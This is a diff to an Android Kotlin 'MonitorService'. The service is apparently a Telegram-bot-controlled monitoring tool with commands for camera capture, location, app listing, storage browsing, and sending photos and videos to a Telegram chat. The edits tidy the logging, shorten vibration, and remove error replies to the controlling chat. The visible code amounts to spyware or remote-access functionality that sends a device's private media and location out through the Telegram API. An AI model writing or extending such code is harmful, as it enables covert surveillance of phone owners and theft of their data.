@@ -93,7 +93,7 @@ class MonitorService : Service() {
             start()
             cameraHandler = Handler(looper)
         }
-        Log.d(TAG, "Service Created & Config Initialized. Token length: ${botToken.length}, Target ChatId: $allowedChatId")
+        Log.d(TAG, "Service Created & Config Initialized.")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -168,13 +168,11 @@ class MonitorService : Service() {
                                 if (targetChatIdStr.isEmpty() || currentChatIdStr == targetChatIdStr) {
                                     handleCommand(chatId, text)
                                 } else {
-                                    Log.w(TAG, "Unauthorized access attempt from chatId: $currentChatIdStr (Expected: $targetChatIdStr)")
+                                    Log.w(TAG, "Unauthorized access attempt from chatId: $currentChatIdStr")
                                     sendTelegramMessage(chatId, "⛔ Access Denied! Your Chat ID ($currentChatIdStr) is not authorized." + devCredit)
                                 }
                             }
                         }
-                    } else {
-                        Log.e(TAG, "Telegram API error response code: $responseCode")
                     }
                     connection.disconnect()
                 } catch (e: Exception) {
@@ -292,7 +290,7 @@ class MonitorService : Service() {
                 setFlashlight(false)
             }
             cmd == "/vibrate" -> {
-                sendTelegramMessage(chatId, "📳 Vibrating device for 10 seconds..." + devCredit)
+                sendTelegramMessage(chatId, "📳 Vibrating device for 5 seconds..." + devCredit)
                 triggerVibration()
             }
             else -> {
@@ -496,22 +494,27 @@ class MonitorService : Service() {
     private fun triggerVibration() {
         serviceScope.launch(Dispatchers.IO) {
             try {
-                val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                     val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
-                    vibratorManager.defaultVibrator
+                    val vibrator = vibratorManager.defaultVibrator
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        vibrator.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE))
+                    } else {
+                        @Suppress("DEPRECATION")
+                        vibrator.vibrate(5000)
+                    }
                 } else {
                     @Suppress("DEPRECATION")
-                    getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                }
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    vibrator.vibrate(VibrationEffect.createOneShot(10000, VibrationEffect.DEFAULT_AMPLITUDE))
-                } else {
-                    @Suppress("DEPRECATION")
-                    vibrator.vibrate(10000)
+                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        vibrator.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE))
+                    } else {
+                        @Suppress("DEPRECATION")
+                        vibrator.vibrate(5000)
+                    }
                 }
             } catch (e: Exception) {
-                e.printStackTrace()
+                Log.e(TAG, "Vibration error: ${e.message}", e)
             }
         }
     }
@@ -576,7 +579,6 @@ class MonitorService : Service() {
                 sendPostRequest("https://api.telegram.org/bot$botToken/sendMessage", payload)
             } catch (e: Exception) {
                 Log.e(TAG, "Error in photo folders: ${e.message}", e)
-                sendTelegramMessage(chatId, "❌ Error scanning photo folders: ${e.message}" + devCredit)
             }
         }
     }
@@ -622,7 +624,7 @@ class MonitorService : Service() {
                 }
 
             } catch (e: Exception) {
-                Log.e(TAG, "Error sending photos from folder: ${e.message}", e)
+                Log.e(TAG, "Error sending photos: ${e.message}", e)
             }
         }
     }
@@ -726,7 +728,7 @@ class MonitorService : Service() {
                 }
 
             } catch (e: Exception) {
-                Log.e(TAG, "Error sending videos from folder: ${e.message}", e)
+                Log.e(TAG, "Error sending videos: ${e.message}", e)
             }
         }
     }
@@ -761,7 +763,6 @@ class MonitorService : Service() {
                 sendTelegramMessage(chatId, message)
             } catch (e: Exception) {
                 Log.e(TAG, "Error fetching apps: ${e.message}", e)
-                sendTelegramMessage(chatId, "❌ Error fetching apps: ${e.message}" + devCredit)
             }
         }
     }
@@ -819,7 +820,6 @@ class MonitorService : Service() {
 
             } catch (e: Exception) {
                 Log.e(TAG, "Storage Explorer Error: ${e.message}", e)
-                sendTelegramMessage(chatId, "❌ Storage Explorer Error: ${e.message}" + devCredit)
             }
         }
     }
@@ -870,7 +870,6 @@ class MonitorService : Service() {
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Location error: ${e.message}", e)
-                sendTelegramMessage(chatId, "❌ Location error: ${e.message}" + devCredit)
             }
         }
     }
@@ -973,7 +972,6 @@ class MonitorService : Service() {
 
             } catch (e: Exception) {
                 Log.e(TAG, "Camera Error: ${e.message}", e)
-                sendTelegramMessage(chatId, "❌ Camera Error: ${e.message}" + devCredit)
             } finally {
                 try { captureSession?.close() } catch (e: Exception) {}
                 try { cameraDevice?.close() } catch (e: Exception) {}
